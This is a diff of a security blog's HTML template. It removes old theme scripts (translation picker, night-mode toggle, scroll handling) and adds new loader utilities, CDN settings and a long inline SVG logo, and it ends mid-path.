-    block.setAttribute('class', 'hljs ' + lang);
-    block.parentNode.setAttribute('data-lang', lang);
-  }
-
-  function addBadge(block) {
-    var enabled = ('true' || 'true').toLowerCase();
-    if (enabled == 'true') {
-      var pre = block.parentElement;
-      pre.classList.add('badge');
-    }
-  }
-
-  function handle(block) {
-    addLangData(block);
-    addBadge(block)
-    hljs.highlightBlock(block);
-  }
-
-  for (var i = 0; i < els.length; i++) {
-    var el = els[i];
-    handle(el);
-  }
-});
-</script>
-
-<style>
-  /* code language badge */
-  pre.badge::before {
-    content: attr(data-lang);
-    color: #fff;
-    background-color: #ff4e00;
-    padding: 0 .5em;
-    border-radius: 0 2px;
-    text-transform: uppercase;
-    text-align: center;
-    min-width: 32px;
-    display: inline-block;
-    position: absolute;
-    right: 0;
-  }
-
-  /* fix wrong badge display for firefox browser */
-  code > table pre::before {
-    display: none;
-  }
-</style>
-</head>
-<body>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<header class="site-header " role="banner">
-
-  <div class="wrapper">
-    <div class="site-header-inner">
-<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
-  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
-  DC0deZer0
-</a>
-</span><nav class="site-nav">
-          <input type="checkbox" id="nav-trigger" class="nav-trigger">
-          <label for="nav-trigger">
-            <span class="menu-icon">
-              <svg viewbox="0 0 18 15" width="18px" height="15px">
-                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
-              </svg>
-            </span>
-          </label>
-
-          <div class="trigger">
-<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>
-
-
-
-
-<span class="page-link">
-
-<div id="google_translate_element" style="display: none;">
-</div>
-
-<span class="ct-language">
-  <ul class="list-unstyled ct-language-dropdown">
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="en">
-          
-          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="fr">
-          
-          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="zh-CN">
-          
-          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="ja">
-          
-          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="ko">
-          
-          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="ru">
-          
-          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
-          
-        </a>
-      </li>
-    
-  </ul>
-</span>
-
-<script type="text/javascript">
-function googleTranslateElementInit() {
-  new google.translate.TranslateElement({
-    pageLanguage: '',
-    autoDisplay: false,
-    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
-  }, 'google_translate_element');
-
-  function restoreLang() {
-    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
-    if (!iframe) return;
-
-    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
-    var restore_el = innerDoc.getElementsByTagName("button");
-
-    for (var i = 0; i < restore_el.length; i++) {
-      if (restore_el[i].id.indexOf("restore") >= 0) {
-        restore_el[i].click();
-        var close_el = innerDoc.getElementsByClassName("goog-close-link");
-        close_el[0].click();
-        return;
-      }
-    }
-  }
-
-  function triggerHtmlEvent(element, eventName) {
-    var event;
-    if (document.createEvent) {
-      event = document.createEvent('HTMLEvents');
-      event.initEvent(eventName, true, true);
-      element.dispatchEvent(event);
-    } else {
-      event = document.createEventObject();
-      event.eventType = eventName;
-      element.fireEvent('on' + event.eventType, event);
-    }
-  }
-
-  var googleCombo = document.querySelector("select.goog-te-combo");
-  var langSelect = document.querySelector('.ct-language');
-  langSelect.addEventListener('click', function(event) {
-    if (!event.target) {
-      return;
-    }
-
-    var selected = document.querySelector('.ct-language .ct-language-selected');
-    if (selected) {
-      selected.classList.remove('ct-language-selected');
-    }
-
-    var target = event.target;
-    while (target && target !== langSelect ) {
-      if (target.matches('.lang-select')) {
-        break;
-      }
-      target = target.parentElement;
-    }
-
-    if (target && target.matches('.lang-select')) {
-      var lang = target.getAttribute('data-lang');
-      if (googleCombo.value == lang) {
-        restoreLang();
-      } else {
-        target.parentElement.classList.add('ct-language-selected');
-        googleCombo.value = lang;
-        triggerHtmlEvent(googleCombo, 'change');
-      }
-    }
-
-    event.preventDefault();
-  });
-}
-</script>
-
-<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-</span>
-</div>
-        </nav>
-</div>
-  </div>
-</header>
-
-<script>
-  (function() {
-    var lastScrollY = getScrollPos().y;
-    var documentElement = document.documentElement;
-
-    function storeScrollData() {
-      var y = getScrollPos().y;var scrollStatus = "";
-
-      if (y <= 0) {
-        scrollStatus = "top";
-      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
-        scrollStatus = "bottom";
-      } else {
-        var isScrollDown = (y - lastScrollY > 0) ? true : false;
-        scrollStatus = isScrollDown ? "down" : "up";
-      }
-
-      lastScrollY = y;
-      documentElement.setAttribute("data-scroll-status", scrollStatus);
-    }
-
-    window.addEventListener('scroll', function(e) {
-      storeScrollData();
-    });
-
-    storeScrollData();
-  })();
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<script>
-  function hashLocate(hashValue) {
-    hashValue = hashValue.replace(/^.*#h-/, '');
-    var element = document.getElementById(hashValue);
-
-    if (!element) {
-      return;
-    }
-
-    var header = document.querySelector('header.site-header');
-    var headerRect = header.getBoundingClientRect();
-    var headerTop = Math.floor(headerRect.top);
-    var headerHeight = Math.floor(headerRect.height);
-    var scrollPos = getScrollPos();
-    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
-
-    if (offsetY == scrollPos.y) {
-      return;
-    }
-
-    if (headerTop == 0  && offsetY > scrollPos.y) {
-      offsetY += headerHeight + 2;
-    } else if (headerTop < 0  && offsetY < scrollPos.y) {
-      offsetY -= headerHeight - 2;
-    }
-
-    smoothScrollTo(offsetY);
-  }
-
-  // The first event occurred
-  window.addEventListener('load', function(event) {
-    if (window.location.hash) {
-      hashLocate(window.location.hash);
-    }
-  });
-
-  // The first event occurred
-  window.addEventListener('click', function(event) {
-    if (event.target.tagName.toLowerCase() == 'a') {
-      hashLocate(event.target.getAttribute('href'));
-    }
-  });
-</script>
-<div class="theme-toggle">
-  <input type="checkbox" id="theme-switch">
-  <label for="theme-switch">
-    <div class="toggle"></div>
-    <div class="names">
-      <p class="light">Light</p>
-      <p class="dark">Dark</p>
-    </div>
-  </label>
-</div>
-
-
-
-
-<script>
-  (function() {
-    var sw = document.getElementById('theme-switch');
-    var html = document.getElementsByTagName('html')[0];
-    var nightModeOption = ('auto' || 'auto').toLowerCase();
-    var storage = nightModeOption === 'manual'
-        ? localStorage
-        : sessionStorage;
-    var themeData = loadThemeData();
-
-    function saveThemeData(data) {
-      storage.setItem('theme', JSON.stringify(data));
-    }
-
-    function loadThemeData() {
-      var data = storage.getItem('theme');
-      try {
-        data = JSON.parse(data ? data : '');
-      } catch(e) {
-        data = { nightShift: undefined, autoToggleAt: 0 };
-        saveThemeData(data);
-      }
-      return data;
-    }
-
-    function handleThemeToggle(nightShift) {
-      themeData.nightShift = nightShift;
-      saveThemeData(themeData);
-      html.dataset.theme = nightShift ? 'dark' : 'light';
-      setTimeout(function() {
-        sw.checked = nightShift ? true : false;
-      }, 50);
-    }
-
-    function autoThemeToggle() {
-      // Next time point of theme toggle
-      var now = new Date();
-      var toggleAt = new Date();
-      var hours = now.getHours();
-      var nightShift = hours >= 19 || hours <=7;
-
-      if (nightShift) {
-        if (hours > 7) {
-          toggleAt.setDate(toggleAt.getDate() + 1);
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
         }
-        toggleAt.setHours(7);
-      } else {
-        toggleAt.setHours(19);
       }
-
-      toggleAt.setMinutes(0);
-      toggleAt.setSeconds(0);
-      toggleAt.setMilliseconds(0)
-
-      var delay = toggleAt.getTime() - now.getTime();
-
-      // auto toggle theme mode
-      setTimeout(function() {
-        handleThemeToggle(!nightShift);
-      }, delay);
-
-      return {
-        nightShift: nightShift,
-        toggleAt: toggleAt.getTime()
-      };
-    }
-
-    // Listen the theme toggle event
-    sw.addEventListener('change', function(event) {
-      handleThemeToggle(event.target.checked);
     });
-
-    if (nightModeOption == 'auto') {
-      var data = autoThemeToggle();
-
-      // Toggle theme by local setting
-      if (data.toggleAt > themeData.autoToggleAt) {
-        themeData.autoToggleAt = data.toggleAt;
-        handleThemeToggle(data.nightShift);
-      } else {
-        handleThemeToggle(themeData.nightShift);
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
       }
-    } else if (nightModeOption == 'manual') {
-      handleThemeToggle(themeData.nightShift);
-    } else {
-      var nightShift = themeData.nightShift;
-      if (nightShift === undefined) {
-        nightShift = nightModeOption === 'on';
-      }
-      handleThemeToggle(nightShift);
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
     }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
   })();
 </script>
-<main class="page-content" aria-label="Content">
-      <div class="wrapper">
-        <div class="framework">
-  <section class="main">
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
 
-     <div class="post">
-  <section>
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="488.000000pt" height="490.000000pt" viewBox="0 0 488.000000 490.000000"
+ preserveAspectRatio="xMidYMid meet">
 
+<g transform="translate(0.000000,490.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M2352 4791 c-69 -26 -171 -82 -247 -136 -143 -102 -210 -182 -263
+-316 -17 -41 -57 -135 -91 -209 -108 -241 -106 -301 14 -490 19 -30 31 -58 27
+-62 -9 -9 -276 -123 -467 -200 -82 -33 -166 -68 -185 -78 -62 -32 -129 -109
+-172 -199 -22 -46 -43 -79 -48 -75 -22 25 -134 242 -171 332 -23 56 -46 102
+-51 102 -4 0 -6 -10 -4 -22 3 -13 22 -135 42 -273 39 -270 42 -280 99 -270 16
+3 149 21 295 40 458 59 888 87 1340 87 425 0 654 -16 1289 -93 185 -22 338
+-36 342 -32 5 5 14 36 20 68 13 73 68 489 64 493 -1 1 -13 -23 -25 -55 -36
+-90 -113 -241 -163 -318 l-46 -70 -10 28 c-61 159 -130 234 -266 287 -116 45
+-580 242 -587 248 -4 4 16 43 44 87 59 91 78 147 78 219 0 63 -23 127 -135
+380 -76 172 -95 206 -144 259 -77 83 -193 167 -315 228 -123 61 -183 70 -264
+40z m216 -156 c71 -36 108 -65 81 -65 -8 0 -49 7 -92 15 -139 27 -243 -16
+-313 -130 -10 -16 -35 -51 -56 -76 -21 -25 -38 -48 -38 -51 0 -3 57 -9 126
+-13 69 -4 122 -11 117 -15 -4 -5 -74 -29 -154 -54 -81 -26 -158 -55 -172 -66
+-23 -18 -40 -53 -31 -63 3 -2 48 4 102 13 135 25 282 30 282 10 0 -17 -42 -33
+-133 -51 -90 -18 -146 -44 -131 -59 5 -5 114 -4 244 2 174 8 265 8 350 -1 188
+-18 181 -26 -23 -26 -246 -1 -408 -25 -646 -97 -129 -40 -171 -73 -171 -137 0
+-48 32 -132 85 -222 34 -59 35 -62 10 -39 -85 78 -175 248 -182 345 -5 57 -1
+71 67 240 40 99 86 206 103 238 59 112 236 275 345 318 77 30 147 25 230 -16z
+m-89 -932 c22 -74 22 -78 4 -91 -22 -16 -78 -9 -103 13 -15 14 -18 14 -30 0
+-10 -12 -10 -21 -2 -40 7 -14 16 -25 22 -25 6 0 8 -4 5 -10 -12 -20 -63 -10
+-101 21 -85 67 -88 62 -22 -28 51 -69 66 -77 148 -69 36 4 74 4 83 0 31 -12
+17 -24 -28 -24 -51 0 -52 -3 -34 -76 6 -25 9 -47 6 -50 -3 -4 -31 6 -62 20
+-77 35 -164 125 -209 218 -40 80 -57 148 -37 148 63 0 261 35 286 50 17 10 35
+19 40 19 6 1 21 -34 34 -76z m250 10 l24 -6 -24 -13 c-41 -23 -110 -17 -144
+12 l-30 25 75 -6 c41 -3 86 -9 99 -12z m-855 -239 c18 -18 213 -248 236 -279
+16 -20 -178 110 -263 177 -54 42 -80 47 -116 19 l-25 -19 53 -71 c30 -40 51
+-74 48 -77 -3 -4 -39 14 -79 39 -40 25 -84 48 -98 52 -42 10 -291 -84 -338
+-128 -33 -30 -48 -62 -62 -131 -11 -53 -13 -57 -28 -43 -9 9 -17 40 -20 71 -2
+31 -9 56 -14 56 -6 0 -22 -8 -36 -18 -51 -35 -52 -35 -41 -3 23 66 67 93 322
+196 133 55 283 116 332 137 104 43 108 43 129 22z m1474 -110 c169 -70 324
+-135 344 -145 33 -17 98 -102 86 -114 -2 -2 -26 12 -54 32 -27 19 -85 52 -129
+73 -92 44 -383 150 -410 150 -10 0 -50 -25 -90 -55 -39 -30 -75 -55 -79 -55
+-4 0 13 26 37 58 61 80 61 81 41 103 -22 25 -55 24 -105 -2 -23 -11 -43 -19
+-45 -16 -6 6 76 97 87 97 6 0 148 -57 317 -126z"/>
+<path d="M2105 2961 c-49 -4 -101 -12 -115 -18 -46 -20 -79 -67 -139 -203 -52
+-115 -61 -144 -61 -193 0 -67 8 -87 103 -244 93 -153 99 -157 262 -161 143 -4
+180 4 195 43 10 27 -2 74 -23 87 -7 4 -67 8 -134 8 l-121 0 -72 123 c-56 97
+-70 128 -66 152 2 17 29 83 59 146 l54 116 129 6 c124 6 130 8 152 33 25 29
+24 66 -3 93 -17 18 -95 22 -220 12z"/>
+<path d="M2594 2961 c-12 -5 -25 -18 -29 -28 -4 -10 -10 -182 -12 -383 -5
+-399 -6 -394 52 -406 22 -4 38 0 55 14 23 19 25 28 30 132 l5 112 149 -137
+c139 -128 150 -136 184 -133 44 4 69 39 58 81 -4 17 -67 83 -176 183 l-170
+157 53 39 c28 22 116 84 193 139 78 55 145 106 148 115 25 65 -32 118 -97 90
+-18 -7 -99 -61 -181 -120 -81 -58 -150 -106 -152 -106 -3 0 -3 49 -2 110 2 87
+0 112 -12 124 -19 20 -69 28 -96 17z"/>
+<path d="M3356 2889 c-8 -48 -76 -729 -76 -759 l0 -25 223 -30 c122 -16 237
+-29 256 -29 40 1 61 24 61 69 0 55 -21 64 -209 89 -94 13 -173 25 -176 27 -2
+2 2 47 8 99 11 83 14 95 31 93 10 -1 49 -4 87 -8 60 -6 69 -5 88 14 12 12 21
+34 21 51 0 48 -29 68 -108 76 -38 3 -75 9 -81 13 -11 7 4 180 17 192 4 3 81
+-4 172 -17 91 -13 179 -23 196 -23 76 -2 90 111 16 133 -20 6 -355 52 -454 62
+l-67 7 -5 -34z"/>
+<path d="M1224 2880 c-12 -4 -24 -16 -28 -26 -9 -25 -59 -333 -92 -568 l-27
+-199 28 -24 c20 -18 35 -23 54 -18 40 9 58 38 71 114 13 78 9 76 139 87 l66 5
+32 -70 c24 -54 37 -72 57 -77 39 -9 75 3 88 31 13 29 11 34 -115 330 -121 284
+-174 398 -194 413 -19 14 -48 15 -79 2z m134 -491 c-7 -5 -32 -9 -54 -9 l-41
+0 13 83 c8 45 14 87 15 92 0 6 19 -28 40 -74 31 -65 37 -86 27 -92z"/>
+<path d="M4154 2797 c-7 -19 -144 -739 -144 -758 0 -44 97 -73 124 -37 7 9 27
+90 46 180 18 90 36 169 40 176 6 12 82 -151 171 -368 32 -79 45 -92 93 -88 34
+2 43 8 55 32 13 28 10 38 -58 205 -91 220 -89 216 -65 207 78 -30 182 -10 227
+44 35 41 60 150 47 200 -13 49 -49 93 -95 114 -20 10 -118 35 -218 57 -100 21
+-190 41 -200 43 -10 3 -20 -1 -23 -7z m284 -192 c52 -13 98 -27 104 -33 11
+-11 -6 -87 -23 -97 -7 -5 -249 41 -266 50 -2 1 3 27 9 58 l12 57 36 -6 c19 -4
+77 -17 128 -29z"/>
+<path d="M663 2789 c-55 -16 -57 -34 -28 -182 14 -73 28 -139 31 -148 3 -12
+-20 -21 -123 -43 -71 -15 -132 -28 -138 -27 -5 0 -25 62 -43 137 -18 76 -40
+146 -49 156 -29 33 -106 17 -123 -26 -7 -18 12 -104 81 -371 49 -191 94 -355
+99 -365 12 -23 37 -29 78 -18 54 14 57 36 22 183 -17 72 -33 137 -35 146 -4
+13 17 21 112 42 111 26 153 32 153 23 0 -8 51 -252 56 -269 3 -10 16 -25 29
+-33 35 -23 92 -3 102 34 4 16 -17 150 -56 352 -77 404 -75 394 -106 408 -14 7
+-27 12 -28 11 -1 0 -17 -5 -34 -10z"/>
+<path d="M2050 2069 c-545 -22 -1030 -81 -1605 -196 -181 -36 -334 -69 -338
+-73 -12 -11 9 -47 38 -66 15 -9 190 -46 432 -90 343 -63 411 -78 430 -96 13
+-12 63 -85 111 -162 97 -158 200 -299 297 -411 36 -41 65 -79 65 -85 0 -6 -79
+-148 -175 -317 -150 -263 -175 -313 -175 -349 0 -27 7 -51 21 -68 47 -59 -32
+-56 1291 -56 1185 0 1214 1 1245 20 87 53 85 119 -9 276 -58 97 -236 411 -267
+472 -11 21 -6 31 62 110 132 156 236 301 346 485 29 48 62 92 73 98 11 6 136
+31 277 55 388 66 548 102 582 132 16 13 29 27 29 31 0 16 -78 41 -215 70 -837
+179 -1689 253 -2515 220z m1265 -134 l25 -24 0 -490 0 -490 -24 -28 -24 -28
+-852 0 -852 0 -24 28 -24 28 0 485 0 486 29 29 29 29 847 0 846 0 24 -25z
+m-14 -1085 c48 -14 76 -46 149 -180 35 -63 103 -185 152 -270 97 -169 106
+-203 58 -227 -20 -10 -280 -13 -1221 -13 -1195 0 -1196 0 -1223 21 -14 11 -26
+30 -26 41 0 26 326 600 348 613 9 6 26 13 37 17 34 10 1686 9 1726 -2z"/>
+<path d="M1627 1873 c-4 -3 -7 -210 -7 -460 l0 -453 820 0 820 0 0 460 0 460
+-813 0 c-448 0 -817 -3 -820 -7z m1163 -463 l0 -350 -350 0 -350 0 0 350 0
+350 350 0 350 0 0 -350z"/>
+<path d="M2106 1740 c-2 -3 -2 -153 -2 -335 l1 -330 335 0 335 0 0 334 0 334
+-333 1 c-184 1 -335 -1 -336 -4z m436 -85 c3 -4 2 -25 -3 -48 -20 -94 -15 -87
+-68 -87 l-50 0 -14 63 c-8 34 -12 65 -10 70 5 8 137 10 145 2z m-24 -177 c-3
+-20 -9 -23 -48 -23 -39 0 -45 3 -48 23 -3 20 0 22 48 22 48 0 51 -2 48 -22z
+m-211 -49 c21 -8 24 -14 21 -56 l-3 -47 -60 -13 c-33 -7 -63 -12 -67 -13 -5 0
+-8 34 -8 76 l0 76 47 -7 c25 -4 57 -11 70 -16z m83 -39 c0 -22 1 -43 3 -47 1
+-5 -10 -9 -25 -11 -27 -3 -28 -1 -28 41 0 48 5 57 32 57 14 0 18 -8 18 -40z
+m90 15 c18 -21 -16 -61 -37 -44 -16 14 -17 31 -1 47 16 16 23 15 38 -3z m70
+-40 c11 -13 8 -21 -20 -50 -32 -33 -35 -34 -52 -18 -18 16 -17 18 14 50 36 38
+41 39 58 18z m120 -85 l25 -19 -50 -51 c-27 -27 -54 -50 -60 -50 -5 0 -25 26
+-44 56 l-33 56 33 34 32 33 36 -20 c20 -11 47 -29 61 -39z"/>
+<path d="M1600 800 c-30 -30 -24 -40 26 -40 55 0 84 14 84 40 0 17 -7 20 -45
+20 -32 0 -51 -6 -65 -20z"/>
+<path d="M1746 804 c-22 -22 -20 -33 8 -40 37 -9 78 -1 90 19 8 14 8 20 -4 27
+-23 15 -77 12 -94 -6z"/>
+<path d="M1897 813 c-12 -3 -17 -12 -15 -26 3 -19 11 -22 51 -25 42 -3 48 0
+56 20 7 19 5 24 -13 30 -24 7 -54 8 -79 1z"/>
+<path d="M2035 804 c-24 -25 -13 -39 34 -42 45 -3 74 12 69 36 -4 22 -82 26
+-103 6z"/>
+<path d="M2320 805 c-25 -30 -4 -46 52 -43 45 3 53 6 56 24 2 15 -4 23 -20 28
+-39 10 -75 7 -88 -9z"/>
+<path d="M2478 813 c-11 -3 -18 -14 -18 -29 0 -22 3 -24 55 -24 46 0 55 3 55
+18 0 36 -36 50 -92 35z"/>
+<path d="M2618 813 c-43 -11 -10 -53 42 -53 50 0 65 12 51 39 -12 21 -47 26
+-93 14z"/>
+<path d="M2758 813 c-21 -5 -21 -8 -8 -34 14 -25 97 -28 107 -3 12 32 -42 52
+-99 37z"/>
+<path d="M2907 813 c-12 -3 -17 -12 -15 -26 3 -20 9 -22 58 -22 49 0 55 2 52
+20 -6 32 -40 42 -95 28z"/>
+<path d="M3030 807 c0 -37 64 -58 114 -38 19 7 19 8 -2 29 -26 26 -112 32
+-112 9z"/>
+<path d="M3187 812 c-16 -7 -16 -9 -2 -30 13 -17 26 -22 60 -22 51 0 60 9 39
+38 -15 22 -59 28 -97 14z"/>
+<path d="M2167 790 c-6 -23 20 -33 74 -28 26 2 35 8 37 26 3 20 0 22 -51 22
+-46 0 -55 -3 -60 -20z"/>
+<path d="M1560 729 c-10 -17 -9 -23 1 -30 23 -15 87 -10 104 7 25 26 12 39
+-43 42 -44 3 -52 0 -62 -19z"/>
+<path d="M1709 729 c-14 -27 1 -39 53 -39 38 0 68 20 68 46 0 10 -14 14 -55
+14 -45 0 -56 -4 -66 -21z"/>
+<path d="M1859 729 c-15 -28 1 -39 58 -39 32 0 45 5 53 20 16 30 4 40 -50 40
+-40 0 -51 -4 -61 -21z"/>
+<path d="M2011 731 c-16 -29 -15 -29 33 -36 59 -9 88 1 84 28 -3 19 -10 22
+-55 25 -43 3 -54 0 -62 -17z"/>
+<path d="M2160 741 c0 -5 -3 -16 -6 -25 -5 -14 4 -16 60 -16 64 0 66 1 66 25
+0 24 -3 25 -60 25 -33 0 -60 -4 -60 -9z"/>
+<path d="M2311 736 c-21 -25 -3 -36 60 -36 57 0 60 1 57 23 -3 19 -10 22 -54
+25 -36 2 -54 -1 -63 -12z"/>
+<path d="M2460 725 c0 -24 3 -25 60 -25 57 0 60 1 60 25 0 24 -3 25 -60 25
+-57 0 -60 -1 -60 -25z"/>
+<path d="M2610 725 c0 -24 2 -25 61 -25 57 0 60 1 57 23 -3 19 -10 22 -60 25
+-56 3 -58 2 -58 -23z"/>
+<path d="M2758 745 c-3 -3 -4 -15 -1 -26 7 -24 41 -33 89 -25 29 6 35 11 32
+29 -3 19 -10 22 -58 25 -31 2 -59 0 -62 -3z"/>
+<path d="M2908 744 c-12 -11 5 -44 26 -49 11 -2 30 -6 41 -8 12 -3 7 -5 -12
+-6 -38 -1 -48 -13 -33 -41 9 -16 21 -20 66 -20 52 0 55 2 52 22 -2 12 -14 28
+-27 34 -21 11 -21 13 -6 21 14 8 15 14 6 32 -10 17 -21 21 -60 21 -26 0 -50
+-3 -53 -6z"/>
+<path d="M3056 741 c-10 -16 6 -41 30 -47 33 -8 94 4 94 19 0 7 -5 18 -12 25
+-14 14 -104 16 -112 3z"/>
+<path d="M3206 741 c-12 -18 32 -51 67 -51 45 0 65 15 51 37 -12 20 -108 31
+-118 14z"/>
+<path d="M1527 662 c-30 -33 -21 -42 43 -42 56 0 61 2 70 26 6 14 10 27 10 30
